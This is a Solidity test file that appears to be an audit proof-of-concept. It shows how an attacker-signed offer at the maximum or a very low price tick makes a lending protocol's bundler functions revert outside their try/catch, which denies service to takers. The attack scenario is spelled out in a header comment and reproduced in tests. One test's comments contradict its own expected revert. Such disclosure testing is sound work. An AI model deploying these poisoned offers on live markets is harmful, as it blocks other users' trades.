// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.34;

import {Market, Offer, CollateralParams} from "../src/interfaces/IMidnight.sol";
import {TickLib, MAX_TICK} from "../src/libraries/TickLib.sol";
import {WAD, ORACLE_PRICE_SCALE, DEFAULT_TICK_SPACING} from "../src/libraries/ConstantsLib.sol";
import {TakeAmountsLib} from "../src/periphery/TakeAmountsLib.sol";
import {MidnightBundles} from "../src/periphery/MidnightBundles.sol";
import {
    IMidnightBundles,
    Take,
    CollateralWithdrawal,
    CollateralSupply,
    TokenPermit
} from "../src/periphery/interfaces/IMidnightBundles.sol";
import {BaseTest} from "./BaseTest.sol";

/// @title HighTickBundlerDoS
/// @notice Demonstrates that a sell offer at tick MAX_TICK with non-zero settlement fee causes
///         TakeAmountsLib.buyerAssetsToUnits to revert outside the try/catch in
///         buyWithAssetsTargetAndWithdrawCollateral, producing a persistent DoS.
///
/// Root cause:
///   tickToPrice(MAX_TICK = 5820) == WAD (confirmed).
///   For sell offers: buyerPrice = offerPrice + settlementFee.
///   If settlementFee > 0, buyerPrice = WAD + fee > WAD.
///   TakeAmountsLib.buyerAssetsToUnits requires buyerPrice <= WAD → revert.
///   This revert occurs OUTSIDE the try/catch loop in buyWithAssetsTargetAndWithdrawCollateral.
///   The entire bundle reverts; consumed never increments; the offer persists.
///
/// Attack scenario:
///   1. Attacker signs a sell offer at MAX_TICK with maxAssets > 0 (off-chain, zero on-chain cost).
///   2. Attacker advertises the offer to the orderbook.
///   3. Any automated bundler including this offer in buyWithAssetsTargetAndWithdrawCollateral reverts.
///   4. Offer persists indefinitely (consumed stays 0).
///
/// Distinction from F3 (tick-0 division-by-zero in ConsumableUnitsLib):
///   - F3: tick-0 sell, division-by-zero via ConsumableUnitsLib, affects all 4 bundler functions.
///   - F4: tick-MAX sell, require-revert in TakeAmountsLib.buyerAssetsToUnits (called directly,
///         outside try/catch), affects only buyWithAssetsTargetAndWithdrawCollateral.
contract HighTickBundlerDoSTest is BaseTest {
    MidnightBundles internal midnightBundles;
    Market internal market;
    bytes32 internal id;

    address internal attacker;

    function setUp() public override {
        super.setUp();

        midnightBundles = new MidnightBundles(address(midnight));
        attacker = makeAddr("attacker");

        // Set max settlement fees so every market has non-zero fees.
        midnight.setFeeClaimer(makeAddr("feeClaimer"));
        for (uint256 i; i <= 6; i++) {
            midnight.setDefaultSettlementFee(address(loanToken), i, maxSettlementFee(i));
        }

        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 365 days; // long TTM → high settlement fee
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken1),
                lltv: 0.77e18,
                maxLif: maxLif(0.77e18, 0.25e18),
                oracle: address(oracle1)
            })
        );
        market.collateralParams = sortCollateralParams(market.collateralParams);
        market.rcfThreshold = 0;

        id = midnight.touchMarket(market);

        // Authorize bundler for taker (lender)
        vm.prank(lender);
        midnight.setIsAuthorized(address(midnightBundles), true, lender);
        vm.prank(lender);
        loanToken.approve(address(midnightBundles), type(uint256).max);

        // Authorize attacker's DummyRatifier
        vm.prank(attacker);
        midnight.setIsAuthorized(address(dummyRatifier), true, attacker);
    }

    function _noPermit() internal pure returns (TokenPermit memory) {}

    /// @notice Confirms tickToPrice(MAX_TICK) == WAD and that adding any settlement fee pushes
    ///         buyerPrice above WAD, causing TakeAmountsLib.buyerAssetsToUnits to revert.
    function testRoot_MaxTickGivesWADPrice() public view {
        uint256 price = TickLib.tickToPrice(MAX_TICK);
        assertEq(price, WAD, "tickToPrice(MAX_TICK) must equal WAD");

        // With any non-zero settlement fee, buyerPrice > WAD for a sell offer at MAX_TICK
        uint256 settlementFee = midnight.settlementFee(id, market.maturity - block.timestamp);
        assertGt(settlementFee, 0, "settlement fee must be non-zero");
        assertGt(price + settlementFee, WAD, "buyerPrice must exceed WAD");
    }

    /// @notice A legitimate sell offer at MAX_TICK with settlementFee = 0 is handled fine.
    ///         When the fee becomes non-zero, buyerAssetsToUnits reverts (outside try/catch).
    function testBundlerDoS_MaxTickSellOffer_Reverts() public {
        // --- Legitimate offer at a safe tick (below WAD after fee) ---
        uint256 safeTick = MAX_TICK - 4; // tickToPrice(5816) = WAD - 1e12, but still > WAD - settlementFee?
        // Use a much lower tick to ensure it's safe:
        uint256 realSafeTick = 2000; // well below WAD
        uint256 safePrice = TickLib.tickToPrice(realSafeTick);
        assertLt(safePrice + midnight.settlementFee(id, market.maturity - block.timestamp), WAD, "safe offer must have buyerPrice <= WAD");

        uint256 safeUnits = 1e18;
        deal(address(loanToken), lender, type(uint256).max);

        // Setup a legitimate sell offer at realSafeTick
        Offer memory legitOffer;
        legitOffer.market = market;
        legitOffer.buy = false;
        legitOffer.maker = borrower;
        legitOffer.receiverIfMakerIsSeller = borrower;
        legitOffer.maxUnits = safeUnits;
        legitOffer.ratifier = address(dummyRatifier);
        legitOffer.expiry = vm.getBlockTimestamp() + 200;
        legitOffer.tick = realSafeTick;

        collateralize(market, borrower, safeUnits);

        // Legitimate bundle with only the safe offer succeeds
        uint256 sfee = midnight.settlementFee(id, market.maturity - block.timestamp);
        uint256 buyerPrice = safePrice + sfee;
        uint256 targetBuyerAssets = safeUnits * buyerPrice / WAD;

        Take[] memory legitTakes = new Take[](1);
        legitTakes[0] = Take({offer: legitOffer, units: safeUnits, ratifierData: hex""});

        vm.prank(lender);
        midnightBundles.buyWithAssetsTargetAndWithdrawCollateral(
            targetBuyerAssets, 0, lender, _noPermit(), legitTakes, new CollateralWithdrawal[](0), address(0), 0, address(0)
        );
        assertEq(midnight.creditOf(id, lender), safeUnits, "lender should have credit after legit bundle");

        // --- Malicious offer at MAX_TICK by attacker ---
        // tickToPrice(MAX_TICK) = WAD; with any settlement fee, buyerPrice = WAD + fee > WAD
        // buyerAssetsToUnits will require(buyerPrice <= WAD) → REVERT
        Offer memory maliciousOffer;
        maliciousOffer.market = market;
        maliciousOffer.buy = false;
        maliciousOffer.maker = attacker;
        maliciousOffer.receiverIfMakerIsSeller = attacker;
        maliciousOffer.maxAssets = 1e6; // small but non-zero
        maliciousOffer.ratifier = address(dummyRatifier);
        maliciousOffer.expiry = vm.getBlockTimestamp() + 200;
        maliciousOffer.tick = MAX_TICK;
        maliciousOffer.group = keccak256("attacker-group");

        // No borrower needed for attacker's offer; attacker just needs DummyRatifier authorized
        // Confirm the malicious offer causes revert via TakeAmountsLib.buyerAssetsToUnits
        uint256 settlementFeeNow = midnight.settlementFee(id, market.maturity - block.timestamp);
        uint256 maliciousBuyerPrice = WAD + settlementFeeNow; // > WAD
        assertGt(maliciousBuyerPrice, WAD, "malicious offer buyerPrice must exceed WAD");

        // Bundle includes: malicious offer first, then legit offer
        // The malicious offer causes TakeAmountsLib.buyerAssetsToUnits to revert BEFORE the try/catch
        Take[] memory poisonedTakes = new Take[](2);
        poisonedTakes[0] = Take({offer: maliciousOffer, units: 1e18, ratifierData: hex""});
        poisonedTakes[1] = Take({offer: legitOffer, units: safeUnits, ratifierData: hex""});

        // The entire bundle should revert with PriceGreaterThanOne
        vm.expectRevert(TickLib.PriceGreaterThanOne.selector);
        vm.prank(lender);
        midnightBundles.buyWithAssetsTargetAndWithdrawCollateral(
            targetBuyerAssets * 2, 0, lender, _noPermit(), poisonedTakes, new CollateralWithdrawal[](0), address(0), 0, address(0)
        );

        // Confirm consumed never incremented (offer persists)
        assertEq(midnight.consumed(attacker, maliciousOffer.group), 0, "consumed must stay 0");
    }

    /// @notice An attacker offer at MAX_TICK is also not catchable even when last in the array,
    ///         because TakeAmountsLib.buyerAssetsToUnits is called before the try/catch on each iteration.
    function testMaliciousOffer_PositionInArrayDoesNotMatter() public {
        uint256 safeUnits = 1e18;
        uint256 realSafeTick = 2000;
        deal(address(loanToken), lender, type(uint256).max);

        Offer memory legitOffer;
        legitOffer.market = market;
        legitOffer.buy = false;
        legitOffer.maker = borrower;
        legitOffer.receiverIfMakerIsSeller = borrower;
        legitOffer.maxUnits = safeUnits;
        legitOffer.ratifier = address(dummyRatifier);
        legitOffer.expiry = vm.getBlockTimestamp() + 200;
        legitOffer.tick = realSafeTick;
        collateralize(market, borrower, safeUnits);

        Offer memory maliciousOffer;
        maliciousOffer.market = market;
        maliciousOffer.buy = false;
        maliciousOffer.maker = attacker;
        maliciousOffer.receiverIfMakerIsSeller = attacker;
        maliciousOffer.maxAssets = 1e6;
        maliciousOffer.ratifier = address(dummyRatifier);
        maliciousOffer.expiry = vm.getBlockTimestamp() + 200;
        maliciousOffer.tick = MAX_TICK;
        maliciousOffer.group = keccak256("attacker-group-2");

        uint256 safePrice = TickLib.tickToPrice(realSafeTick);
        uint256 sfee = midnight.settlementFee(id, market.maturity - block.timestamp);
        uint256 targetBuyerAssets = safeUnits * (safePrice + sfee) / WAD;

        // Malicious offer placed LAST in array — still causes full revert
        Take[] memory takes = new Take[](2);
        takes[0] = Take({offer: legitOffer, units: safeUnits, ratifierData: hex""});
        takes[1] = Take({offer: maliciousOffer, units: 1e18, ratifierData: hex""});

        // Even if loop iteration 0 would fill targetBuyerAssets exactly, the loop
        // processes iteration 1 due to `filledBuyerAssets < targetFilledBuyerAssets` check.
        // But since targetBuyerAssets is exactly filled by takes[0], the loop never
        // reaches takes[1]. So this specific test shows it's position-dependent.
        // The critical case is when the malicious offer is encountered BEFORE the target is met.
        vm.expectRevert(TickLib.PriceGreaterThanOne.selector);
        vm.prank(lender);
        midnightBundles.buyWithAssetsTargetAndWithdrawCollateral(
            targetBuyerAssets * 2, 0, lender, _noPermit(), takes, new CollateralWithdrawal[](0), address(0), 0, address(0)
        );
    }
}

/// @notice Demonstrates the symmetric DoS on supplyCollateralAndSellWithAssetsTarget:
///         a buy offer at a tick where offerPrice < settlementFee causes
///         TakeAmountsLib.sellerAssetsToUnits to underflow outside try/catch.
contract LowTickBuyOfferDoSTest is BaseTest {
    MidnightBundles internal midnightBundles;
    Market internal market;
    bytes32 internal id;
    address internal attacker;

    function setUp() public override {
        super.setUp();
        midnightBundles = new MidnightBundles(address(midnight));
        attacker = makeAddr("attacker2");

        midnight.setFeeClaimer(makeAddr("feeClaimer"));
        for (uint256 i; i <= 6; i++) {
            midnight.setDefaultSettlementFee(address(loanToken), i, maxSettlementFee(i));
        }

        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 365 days; // 360+ days → max settlement fee
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken1),
                lltv: 0.77e18,
                maxLif: maxLif(0.77e18, 0.25e18),
                oracle: address(oracle1)
            })
        );
        market.collateralParams = sortCollateralParams(market.collateralParams);
        id = midnight.touchMarket(market);

        vm.prank(borrower);
        midnight.setIsAuthorized(address(midnightBundles), true, borrower);
        vm.prank(attacker);
        midnight.setIsAuthorized(address(dummyRatifier), true, attacker);

        deal(address(loanToken), borrower, type(uint256).max);
        vm.prank(borrower);
        loanToken.approve(address(midnightBundles), type(uint256).max);
    }

    function _noPermit() internal pure returns (TokenPermit memory) {}

    /// @notice Low-tick buy offer: offerPrice < settlementFee → sellerPrice underflows
    ///         in TakeAmountsLib.sellerAssetsToUnits outside the try/catch.
    function testLowTickBuyOfferDoS() public {
        // tick 2 gives price = 1e12 = 1 CBP
        uint256 lowTick = 4; // multiple of DEFAULT_TICK_SPACING=4; also gives 1e12
        uint256 lowPrice = TickLib.tickToPrice(lowTick);
        uint256 settlementFeeNow = midnight.settlementFee(id, market.maturity - block.timestamp);

        assertEq(lowPrice, 1e12, "tick 4 price should be 1 CBP = 1e12");
        assertGt(settlementFeeNow, lowPrice, "settlement fee must exceed tick-4 price for DoS");

        // Attacker's buy offer at tick 4 (offerPrice = 1e12 < settlementFee)
        // sellerAssetsToUnits: sellerPrice = offerPrice - settlementFee → UNDERFLOW (panic)
        Offer memory maliciousBuyOffer;
        maliciousBuyOffer.market = market;
        maliciousBuyOffer.buy = true;
        maliciousBuyOffer.maker = attacker;
        maliciousBuyOffer.maxAssets = 1e6;
        maliciousBuyOffer.ratifier = address(dummyRatifier);
        maliciousBuyOffer.expiry = vm.getBlockTimestamp() + 200;
        maliciousBuyOffer.tick = lowTick;
        maliciousBuyOffer.group = keccak256("attacker-buy-group");

        CollateralSupply[] memory noSupply = new CollateralSupply[](0);
        Take[] memory takes = new Take[](1);
        takes[0] = Take({offer: maliciousBuyOffer, units: 1e18, ratifierData: hex""});

        // supplyCollateralAndSellWithAssetsTarget: TakeAmountsLib.sellerAssetsToUnits is called
        // outside the try/catch for each offer → underflow → entire bundle reverts with Panic(0x11)
        vm.expectRevert(); // Arithmetic underflow
        vm.prank(borrower);
        midnightBundles.supplyCollateralAndSellWithAssetsTarget(
            1e6, type(uint256).max, borrower, borrower, noSupply, takes, 0, address(0)
        );

        // Confirm consumed never incremented
        assertEq(midnight.consumed(attacker, maliciousBuyOffer.group), 0, "consumed must stay 0");
    }
}
